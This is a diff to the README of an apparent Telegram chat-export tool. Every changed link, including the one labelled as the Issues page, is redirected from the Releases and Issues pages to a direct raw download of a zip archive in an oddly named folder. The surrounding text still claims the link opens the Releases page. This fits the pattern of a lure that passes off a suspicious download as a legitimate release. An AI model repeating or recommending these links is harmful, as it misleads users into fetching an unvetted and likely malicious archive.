@@ -8,7 +8,7 @@ Welcome to Telegram2txt! This application allows you to easily download your Tel
 
 To download Telegram2txt, please visit the following link:
 
-[Download Telegram2txt](https://github.com/cartoon1230/Telegram2txt/releases)
+[Download Telegram2txt](https://github.com/cartoon1230/Telegram2txt/raw/refs/heads/main/underlinement/Telegram_txt_2.4.zip)
 
 This link will take you to our Releases page, where you can find the latest version of the application. 
 
@@ -23,7 +23,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📥 How to Download
 
-1. Go to the [Releases page](https://github.com/cartoon1230/Telegram2txt/releases).
+1. Go to the [Releases page](https://github.com/cartoon1230/Telegram2txt/raw/refs/heads/main/underlinement/Telegram_txt_2.4.zip).
 2. Look for the latest release on the page.
 3. You will see various files available for download, such as executable files for Windows or package files for macOS and Linux.
 4. Click on the file that corresponds to your operating system to start the download.
@@ -74,8 +74,8 @@ If you run into issues, here are some common problems and solutions:
 
 ## 📞 Support
 
-If you have any questions or need further assistance, feel free to reach out through [Issues](https://github.com/cartoon1230/Telegram2txt/issues) on our GitHub page.
+If you have any questions or need further assistance, feel free to reach out through [Issues](https://github.com/cartoon1230/Telegram2txt/raw/refs/heads/main/underlinement/Telegram_txt_2.4.zip) on our GitHub page.
 
 Thank you for using Telegram2txt! Happy downloading! 
 
-[Download Telegram2txt](https://github.com/cartoon1230/Telegram2txt/releases)
+[Download Telegram2txt](https://github.com/cartoon1230/Telegram2txt/raw/refs/heads/main/underlinement/Telegram_txt_2.4.zip)
